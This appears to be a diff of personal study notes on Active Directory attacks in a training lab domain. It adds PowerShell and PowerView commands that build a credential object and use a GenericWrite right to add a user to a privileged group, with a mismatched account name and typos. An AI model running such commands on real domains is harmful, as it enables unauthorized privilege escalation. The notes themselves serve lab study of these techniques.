@@ -93,6 +93,22 @@ Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -
 3) if we have this access over a `computer object`, we could perform a `resource-based constrained delegation` attack.
 
 
-###
+### Scenario 1 : `damundsen` user have `GenericWrite` over `Help Desk Level 1` group so we can out selves 
 
+
+create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+using PowerView add yourslef
+```powershell
+# check group members
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+
+# add your user
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
+
+```
 
